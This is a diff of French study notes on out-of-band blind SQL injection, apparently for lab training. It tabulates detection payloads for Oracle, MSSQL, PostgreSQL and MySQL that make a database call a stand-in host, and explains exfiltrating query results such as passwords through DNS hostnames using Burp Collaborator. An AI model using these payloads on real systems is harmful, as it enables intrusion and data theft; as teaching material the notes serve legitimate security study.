@@ -20,12 +20,13 @@ Une conditon peut aussi déclencher l'intéraction(`IF ... exec xp_dirtree`), ce
 Deux usages existent. La détection provoque une requête DNS vers notre domaine : si elle apparaît dans le journal, l’injection est confirmée. L’exfiltration glisse le résultat d’une sous-requête dans le nom d’hôte (`motdepasse.COLLAB`), et la donnée arrive dans la requête DNS elle-même, sans extraction caractère par caractère. On peut aussi conditionner l’interaction (`IF ... exec xp_dirtree`), ce qui donne un oracle booléen sur un canal qui marche en asynchrone.
 
 Le déclencheur dépend du SGBD :
-|SGBD|Payload de détection|
-|---|---|
-|Oracle|`EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://COLLAB/"> %r;]>'),'/l') FROM dual`|
-|MSSQL|`'; exec master..xp_dirtree '//COLLAB/a'--`|
-|PostgreSQL|`copy (select '') to program 'nslookup COLLAB'`|
-|MySQL|`SELECT LOAD_FILE('\\\\COLLAB\\a')` (Windows uniquement)| 
+
+| SGBD       | **Payload de détection**                                                                                                                     |
+| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
+| Oracle     | `EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://COLLAB/"> %r;]>'),'/l') FROM dual` |
+| MSSQL      | `'; exec master..xp_dirtree '//COLLAB/a'--`                                                                                                  |
+| PostgreSQL | `copy (select '') to program 'nslookup COLLAB'`                                                                                              |
+| MySQL      | `SELECT LOAD_FILE('\\\\COLLAB\\a')` (Windows uniquement)                                                                                     |
 
 Pour l’exfiltration, on concatène une sous-requête dans le nom d’hôte.
 ```sql
@@ -38,7 +39,7 @@ Anatomie du payload MSSQL de détection : `'` ferme la chaîne, `;` empile une s
 On génère un sous-domaine unique avec Burp Collaborator (bouton “Copy to clipboard” du client), on le place dans le payload adapté au SGBD, on envoie avec Repeater, puis on clique sur “Poll now”. Une ligne DNS, parfois HTTP, prouve que la base a bien émis l’interaction. Le sous-domaine étant unique, on sait quelle requête l’a déclenchée.
 
 ## Comment exploiter (principe)
-1. Repérer un point d’injection où la réponse ne varie jamais (le cookie `TrackingId` dans les labs).
+1. Repérer un point d’injection où la réponse ne varie jamais.
 2. Identifier le SGBD, ou tester les payloads de détection l’un après l’autre.
 3. Confirmer l’interaction dans Collaborator.
 4. Remplacer le sous-domaine par `RÉSULTAT.COLLAB` pour sortir la donnée, et lire le résultat dans le nom de la requête DNS reçue.
